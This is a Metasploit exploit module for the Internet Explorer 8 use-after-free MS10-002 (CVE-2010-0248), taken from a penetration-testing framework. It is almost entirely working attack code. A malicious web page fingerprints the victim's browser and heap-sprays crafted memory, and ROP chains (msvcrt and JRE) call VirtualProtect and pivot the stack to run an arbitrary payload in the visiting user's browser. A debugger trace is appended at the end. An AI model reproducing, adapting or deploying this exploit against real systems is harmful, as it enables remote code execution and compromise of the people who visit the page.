##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS10-002 Internet Explorer Object Memory Use-After-Free",
      'Description'    => %q{
          This module exploits a vulnerability found in Internet Explorer's
        mshtml component.  Due to the way IE handles objects in memory, it is 
        possible to cause a pointer in CTableRowCellsCollectionCacheItem::GetNext
        to be used even after it gets freed, therefore allowing remote code
        execution under the context of the user.

          This particular vulnerability was also one of 2012's Pwn2Own
        challenges, and was later explained by Peter Vreugdenhil with exploitation
        details.  Instead of Peter's method, this module uses heap spraying like
        the 99% to store a specially crafted memory layout before re-using the
        freed memory.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Peter Vreugdenhil', # Vulnerability discovery and exploit writeup
          'juan vazquez',      # Metasploit
          'sinn3r'             # Metasploit
        ],
      'References'     =>
        [
          [ 'MSB', 'MS10-002'],
          [ 'CVE', '2010-0248' ],
          [ 'OSVDB', '61914'],
          [ 'URL', 'http://dvlabs.tippingpoint.com/blog/2012/03/15/pwn2own-2012-challenge-writeup' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-014/']
        ],
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00",
          'DisableNops' => true
        },
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => 'migrate -f',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Ret' => 0x77c15ed5 }, ],
          [ 'IE 8 on Windows 7 SP0',  { 'Rop' => :jre,    'Offset' => '0x5f4', 'Ret' => 0x7c348b05 }  ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 21 2010",
      'DefaultTarget'  => 0))
  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    if agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
      return targets[1]  #IE 8 on Windows XP SP3
    elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8/
      return targets[2]  #IE 8 on Windows 7 SP1 with JRE
    else
      return nil
    end
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have the same setup we're targeting
    if my_target.nil?
      print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    end

    js_code = build_javascript(my_target)

    html = %Q|
<html>
  <head>
  <script>
#{js_code}
    </script>
  </head>
  <body onLoad="window.setTimeout(Start,100);" id="bodyid">

  <table id="tableid">
    <tr><th id="thid"></th></tr>
    <tr id="trid"><td id="tdid"></td></tr>
  </table>

  </body>
</html>
    |

    print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
    send_response(cli, html, {'Content-Type'=>'text/html'})

  end

  def build_javascript(my_target)

    p = get_payload(my_target)
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))

    # The exploit will try to take up the freed memory
    # with a fake item before the reuse
    fake_item = [
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      0x0c0c003c, # pointer to c_table_cell
      junk,
      junk,
      junk,
      0x0c0c0050, # pointer to c_cache_item
      junk,
      junk,
    ].pack("V*")
    fake_item_js = Rex::Text.to_unescape(fake_item)

    # Here start the crafted layout of the memory
    # which will be sprayed to get code execution
    # IE 8 => Spray be sprayed into 0c0c0024
    memory_layout = [
      junk,
      junk,
      junk,
      junk,
      junk,
      junk,
      0x0c0c0040, # ----- points to 0x0c0c0040
      0x0c0c0c0c, # <---|  0x0c0c0c0c + 0x70: 0x0c0c0c7c will store the stackpivot with eax pointing to 0c0c0c0c
      junk,
      junk,
      0x00000000, # Allows to bypass CTableCell::GetAAcolSpan
      junk,       # Stored at 0c0c0c50
      junk,
      junk,
      0x0c0c0078,
      junk,
      junk,
      junk,
      junk,
      junk,
      0x0c0c0c50, # <- Stored at 0c0c0074 (0x0c0c0078 - 4)
      0x00000001  # Stored at 0c0c0078 (0c0c0050+28) # Allows to exit of CTableRowCellsCollectionCacheItem::GetNext faster
    ].pack("V*")
    memory_layout_js = Rex::Text.to_unescape(memory_layout)

    # Steps:
    # 1. Force the free.
    # 2. Try to reuse the freed memory with a fake item.
    # The fake item store crafted pointers to the
    # memory which will be sprayed on step 3.
    # 3. Heap Spray: Shellcode + crafted memory layout to
    # get execution flow when the memory freed in step 1
    # is reused in step 4.
    # 4. Force the memory reuse.
    spray = <<-JS
function Start() {

  var fake_items = unescape("#{fake_item_js}");
  while (fake_items.length < 0x1000) fake_items+= fake_items;
  var fake_item = fake_items.substring(0, (96-6)/2);

  var code = unescape("#{js_code}");
  var memory_layout = unescape("#{memory_layout_js}")
  var nops = unescape("#{js_nops}");
  while (nops.length < 0x80000) nops += nops;
  var offset = nops.substring(0, #{my_target['Offset']} - memory_layout.length);
  var shellcode = memory_layout + offset + code + nops.substring(0, 0x800-#{my_target['Offset']}-code.length);
  while (shellcode.length < 0x40000) shellcode += shellcode;
  var block_shell = shellcode.substring(0, (0x80000-6)/2);

  var heap = new heapLib.ie(0x20000);

  var TableClone = document.getElementById('tableid').cloneNode(1);
  var TableCellUrns = TableClone.cells.urns('a');
  var bla = TableClone.cells.item(1);
  var TableCellUrnsTags = TableCellUrns.tags('a');
  TableClone.outerText = 'a';

  heap.gc();
  for(i = 0; i < 30; i++) {
    heap.alloc(fake_item);
  }

  for (var i=1; i < 0x1C2; i++) {
    heap.alloc(block_shell);
  }

  Result = TableClone.cells;
  Result = TableCellUrnsTags.item(1);

}
    JS

    spray = heaplib(spray, {:noobfu => true})
    return spray
  end

  def nop
    return make_nops(4).unpack("V").first
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V").first
  end

  # ROP chain + shellcode will be sprayed at 0x0c0c0c0c
  def get_payload(t)
    # chain generated by mona.py - See corelan.be
    case t['Rop']
    when :msvcrt
      rop =
      [
        0x77c4e392,  # POP EAX # RETN
        0x77c11120,  # <- *&VirtualProtect()
        0x77c2e493,  # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
        junk,
        0x77c2dd6c,
        0x77c4ec00,  # POP EBP # RETN
        0x77c35459,  # ptr to 'push esp #  ret'
        0x77c47705,  # POP EBX # RETN
        0x00000800,  # <- change size to mark as executable if needed (-> ebx)
        0x77c3ea01,  # POP ECX # RETN
        0x77c5d000,  # W pointer (lpOldProtect) (-> ecx)
        0x77c46100,  # POP EDI # RETN
        0x77c46101,  # ROP NOP (-> edi)
        0x77c4d680,  # POP EDX # RETN
        0x00000040,  # newProtect (0x40) (-> edx)
        0x77c4e392,  # POP EAX # RETN
        nop,  # NOPS (-> eax)
        0x77c12df9,  # PUSHAD # RETN
      ].pack("V*")

    when :jre
      rop =
      [
        0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
        0xfffffdff,  # Value to negate, will become 0x00000201 (dwSize)
        0x7c347f98,  # RETN (ROP NOP)
        0x7c3415a2,  # JMP [EAX]
        0xffffffff,
        0x7c376402,  # skip 4 bytes
        0x7c351e05,  # NEG EAX # RETN
        0x7c345255,  # INC EBX # FPATAN # RETN
        0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
        0x7c344f87,  # POP EDX # RETN
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x7c351eb1,  # NEG EDX # RETN
        0x7c34d201,  # POP ECX # RETN
        0x7c38b001,  # &Writable location
        0x7c347f97,  # POP EAX # RETN
        0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
        0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
        0x7c345c30,  # ptr to 'push esp #  ret '
      ].pack("V*")
    end

    code = rop
    code << make_nops(38)
    code << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+0x6").encode_string # instr length: 2 bytes
    code << [t.ret].pack("V") # Stack Pivot
    code << payload.encoded

    return code
  end

end

=begin
(694.cc0): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000100 ecx=0241f518 edx=7c90e4f4 esi=7c90d6d0 edi=ffffffff
eip=7c8022cf esp=0241f534 ebp=0241f548 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
kernel32!WriteProcessMemory+0x6d:
7c8022cf cc              int     3
=end
